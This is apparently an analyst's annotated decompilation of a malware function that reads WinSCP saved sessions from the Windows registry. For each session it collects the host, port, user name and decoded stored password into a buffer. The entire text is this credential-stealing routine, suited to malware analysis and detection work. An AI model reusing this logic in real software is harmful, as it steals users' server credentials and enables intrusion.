// #STR: "Software\\Martin Prikryl\\WinSCP 2\\Sessions", "Software\\Martin Prikryl\\WinSCP 2\\Configuration"
HKEY __thiscall vdr_steal_WinSCP_data(char *arg_bigStringBuf)
{

  str_WinSCP_data = arg_bigStringBuf;
  lpString1 = arg_bigStringBuf;
  v20 = 0;
  Name[0] = 0;
  memset(&Name[1], 0, 0x103u);
  cchName = 0x104;
  memset(str_HostName, 0, sizeof(str_HostName));
  memset(str_user_name, 0, sizeof(str_user_name));
  memset(str_password, 0, sizeof(str_password));
  dwHostNameLen = 0x400;
  dwUserNameLen = 0x400;
  v19 = 0x400;
  result = RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Martin Prikryl\\WinSCP 2\\Configuration", 0, 1u, &phkResult);
  if ( result )
    return result;
  pstr_UseMasterPassword = ::str_UseMasterPassword;// UseMasterPassword
  str_UseMasterPassword._Myres = 0xF;
  str_UseMasterPassword._Mysize = 0;
  str_UseMasterPassword.u._Buf[0] = 0;
  len = strlen(::str_UseMasterPassword);
  std::string::assign(&str_UseMasterPassword, pstr_UseMasterPassword, len);
  v37 = 0;
  pstr_Security = ::str_Security;
  str_Security._Myres = 0xF;
  str_Security._Mysize = 0;
  str_Security.u._Buf[0] = 0;
  len = strlen(::str_Security);
  std::string::assign(&str_Security, pstr_Security, len);
  LOBYTE(v37) = 1;
  pwstr_UseMasterPassword = vdr_convert_to_wstr(&str_UseMasterPassword, &wstr_UseMasterPassword);
  LOBYTE(v37) = 2;
  pwstr_Security = vdr_convert_to_wstr(&str_Security, &wstr_Security);
  LOBYTE(v37) = 3;
  pwstr_UseMasterPassword_ = pwstr_UseMasterPassword;
  if ( pwstr_UseMasterPassword->_Myres >= 8 )
    pwstr_UseMasterPassword_ = pwstr_UseMasterPassword->u._Ptr;
  if ( pwstr_Security->_Myres >= 8 )
    pwstr_Security = pwstr_Security->u._Ptr;
  dwStatus = RegGetValueW(phkResult, pwstr_Security->u._Buf, pwstr_UseMasterPassword_->u._Buf, 0x10u, 0, pvData, &pcbData) != 0;
  if ( wstr_Security._Myres >= 8 )
    operator delete(wstr_Security.u._Ptr);
  wstr_Security._Myres = 7;
  wstr_Security._Mysize = 0;
  wstr_Security.u._Buf[0] = 0;
  if ( wstr_UseMasterPassword._Myres >= 8 )
    operator delete(wstr_UseMasterPassword.u._Ptr);
  wstr_UseMasterPassword._Myres = 7;
  wstr_UseMasterPassword._Mysize = 0;
  wstr_UseMasterPassword.u._Buf[0] = 0;
  if ( str_Security._Myres >= 0x10 )
    operator delete(str_Security.u._Ptr);
  v37 = 0xFFFFFFFF;
  str_Security._Myres = 0xF;
  str_Security._Mysize = 0;
  str_Security.u._Buf[0] = 0;
  if ( str_UseMasterPassword._Myres >= 0x10 )
    operator delete(str_UseMasterPassword.u._Ptr);
  v9 = phkResult;
  str_UseMasterPassword._Myres = 0xF;
  str_UseMasterPassword._Mysize = 0;
  str_UseMasterPassword.u._Buf[0] = 0;
  if ( !dwStatus )
    goto LABEL_17;
  if ( phkResult )
  {
    RegCloseKey(phkResult);
    v9 = 0;
    phkResult = 0;
LABEL_17:
    if ( v9 )
    {
      RegCloseKey(v9);
      phkResult = 0;
    }
  }
  result = RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Martin Prikryl\\WinSCP 2\\Sessions", 0, 9u, &phkResult);
  if ( result )
    return result;
  if ( !RegEnumKeyExA(phkResult, 0, Name, &cchName, 0, 0, 0, 0) )
  {
    do
    {
      lstrcatA(str_WinSCP_data, "\n");
      lstrcatA(str_WinSCP_data, str_Soft__WinSCP);
      lstrcatA(str_WinSCP_data, "\n");
      lstrcatA(str_WinSCP_data, str_Host__);
      RegGetValueA(phkResult, Name, ::str_HostName, 2u, 0, str_HostName, &dwHostNameLen);
      lstrcatA(str_WinSCP_data, str_HostName);
      dwPortNumberLen = 4;
      if ( RegGetValueA(phkResult, Name, str_PortNumber, 0xFFFFu, 0, &str_port_number, &dwPortNumberLen) )
      {
        lstrcatA(str_WinSCP_data, ":22");
      }
      else
      {
        v10 = sub_425670(&wstr_UseMasterPassword, str_port_number);
        v37 = 4;
        if ( v10->_Myres >= 0x10 )
          v10 = v10->u._Ptr;
        lstrcatA(str_WinSCP_data, v10->u._Buf);
        v37 = 0xFFFFFFFF;
        if ( wstr_UseMasterPassword._Myres >= 0x10 )
          operator delete(wstr_UseMasterPassword.u._Ptr);
        wstr_UseMasterPassword._Myres = 0xF;
        wstr_UseMasterPassword._Mysize = 0;
        LOBYTE(wstr_UseMasterPassword.u._Buf[0]) = 0;
      }
      lstrcatA(str_WinSCP_data, "\n");
      lstrcatA(str_WinSCP_data, str_Login__);
      RegGetValueA(phkResult, Name, str_UserName, 2u, 0, str_user_name, &dwUserNameLen);
      lstrcatA(str_WinSCP_data, str_user_name);
      lpString2._Myres = 0xF;
      lpString2._Mysize = 0;
      lpString2.u._Buf[0] = 0;
      v37 = 5;
      RegGetValueA(phkResult, Name, str_Password, 2u, 0, str_password, &v19);
      lstrcatA(str_WinSCP_data, "\n");
      lstrcatA(str_WinSCP_data, str_Password__);
      if ( StrCmpCA(str_password, g_var_temp) )
      {
        v11 = sub_41E000(str_user_name, str_password, &a3, str_HostName);
        LOBYTE(v37) = 6;
        vdr_std_strcpy(v11, &lpString2);
        LOBYTE(v37) = 5;
        if ( a3._Myres >= 0x10 )
          operator delete(a3.u._Ptr);
        v12 = lpString2.u._Ptr;
        a3._Myres = 0xF;
        a3._Mysize = 0;
        a3.u._Buf[0] = 0;
        if ( lpString2._Myres < 0x10 )
          v12 = &lpString2;
        lstrcatA(lpString1, v12->u._Buf);
        str_WinSCP_data = lpString1;
      }
      lstrcatA(str_WinSCP_data, "\n\n");
      cchName = 0x104;
      v13 = RegEnumKeyExA(phkResult, ++v20, Name, &cchName, 0, 0, 0, 0);
      v37 = 0xFFFFFFFF;
      if ( lpString2._Myres >= 0x10 )
        operator delete(lpString2.u._Ptr);
      lpString2._Myres = 0xF;
      lpString2._Mysize = 0;
      lpString2.u._Buf[0] = 0;
    }
    while ( v13 != 0x103 );
  }
  result = phkResult;
  if ( phkResult )
    result = RegCloseKey(phkResult);
  return result;
}
